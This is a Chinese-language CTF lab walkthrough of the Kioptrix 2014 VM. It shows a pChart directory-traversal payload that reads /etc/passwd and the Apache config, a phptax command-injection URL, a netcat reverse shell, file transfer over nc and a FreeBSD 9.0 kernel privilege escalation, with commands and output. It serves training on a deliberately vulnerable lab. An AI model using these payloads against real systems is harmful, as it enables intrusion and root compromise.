无法获取ip，vmware里删除原来的网卡，再重新添加 [CTF靶场系列-Kioptrix: 2014 (#5) - FreeBuf网络安全行业门户](https://www.freebuf.com/column/211565.html)

# 信息搜集

1、端口扫描

```bash
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
MAC Address: 00:0C:29:BF:F7:2C (VMware)
Device type: general purpose
Running: FreeBSD 7.X|8.X|9.X
OS CPE: cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:9
OS details: FreeBSD 7.0-RELEASE - 9.0-RELEASE
Network Distance: 1 hop
```

2、80端口源码发现web上下文  

```http
http://192.168.0.102/pChart2.1.3/examples/index.php
```

<img src=".\图片\Snipaste_2023-06-19_17-04-47.png" alt="Snipaste_2023-06-19_17-04-47" style="zoom:80%;" />

3、8080端口访问403

```
Forbidden
You don't have permission to access / on this server.
```

# web打点

1、搜索 `pChart2.1.3` cms 已知漏洞再利用

```bash
┌──(root💀kali)-[~/kioptrix2014]
└─# searchsploit pChart     
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                                                                     | php/webapps/31173.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                              
┌──(root💀kali)-[~/kioptrix2014]
└─# searchsploit -m 31173
  Exploit: pChart 2.1.3 - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/31173
     Path: /usr/share/exploitdb/exploits/php/webapps/31173.txt
    Codes: OSVDB-102596, OSVDB-102595
 Verified: True
File Type: HTML document, ASCII text
Copied to: /root/kioptrix2014/31173.txt
```

好利用的漏洞目录遍历

```bash
┌──(root💀kali)-[~/kioptrix2014]
└─# cat 31173.txt 
[1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.
```

2、读取关键文件

密码文件

```http
http://192.168.0.102/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../etc/passwd
```

unix apache 的配置文件

<img src=".\图片\Snipaste_2023-06-19_17-16-17.png" alt="Snipaste_2023-06-19_17-16-17" style="zoom:50%;" />

```http
http://192.168.0.102/pChart2.1.3/examples/index.php?Action=View&Script=/usr/local/etc/apache22/httpd.conf
```

发现 8080 端口好像只允许特定 UA 头访问 `Mozilla/4.0 Mozilla4_browser`

```conf
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
```

3、修改 UA 头再访问 8080 端口

<img src=".\图片\Snipaste_2023-06-19_17-22-21.png" alt="Snipaste_2023-06-19_17-22-21" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-06-19_17-24-45.png" alt="Snipaste_2023-06-19_17-24-45" style="zoom:50%;" />

4、搜索 `phptax` 漏洞利用，另外注意修改 UA 头

```bash
└─# searchsploit phptax  
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                                                              | php/webapps/21833.rb
PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution                                                           | php/webapps/25849.txt
phptax 0.8 - Remote Code Execution                                                                                          | php/webapps/21665.txt
```

```http
http://192.168.0.102:8080/phptax/drawimage.php?pfilez=xxx; uname -a>/tmp/1&pdf=make
```

结合之前的文件读取看回显

```http
http://192.168.0.102/pChart2.1.3/examples/index.php?Action=View&Script=/tmp/1
```

<img src=".\图片\Snipaste_2023-06-19_17-38-13.png" alt="Snipaste_2023-06-19_17-38-13" style="zoom:67%;" />

5、反弹shell

<img src=".\图片\Snipaste_2023-06-19_17-56-31.png" alt="Snipaste_2023-06-19_17-56-31" style="zoom:50%;" />

```bash
┌──(root💀kali)-[~/kioptrix2014]
└─# nc -lvvp 6666                
listening on [any] 6666 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 40584
sh: can't access tty; job control turned off
$ whoami
www
```

# 提权

内核漏洞提权

1、搜索操作系统版本

```bash
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

2、寻找对应漏洞

```bash
┌──(root💀kali)-[~/kioptrix2014]
└─# searchsploit FreeBSD 9.0
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                                                                      | freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation                                                                | freebsd/local/26368.c
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                              
┌──(root💀kali)-[~/kioptrix2014]
└─# searchsploit -m 26368      
  Exploit: FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/26368
     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
    Codes: CVE-2013-2171, OSVDB-94414
 Verified: True
File Type: C source, ASCII text
Copied to: /root/kioptrix2014/26368.c
```

3、kali nc 传输文件到 靶机

kali执行：

```bash
└─# nc -lvp 2233 < 28718.c 
listening on [any] 2233 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 48339
```

靶机执行：

```bash
$ nc 192.168.0.103 2233 > 28718.c
```

4、编译运行，即可提权

```bash
$ gcc 26368.c
26368.c:89:2: warning: no newline at end of file
$ ls
1
26368.c
28718.c
a.out
a.out.core
aprBFUL5x
aprIDfyWR
aprOFwekh
aprcRmk0i
mysql.sock
vmware-fonts0
$ ./a.out
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
```


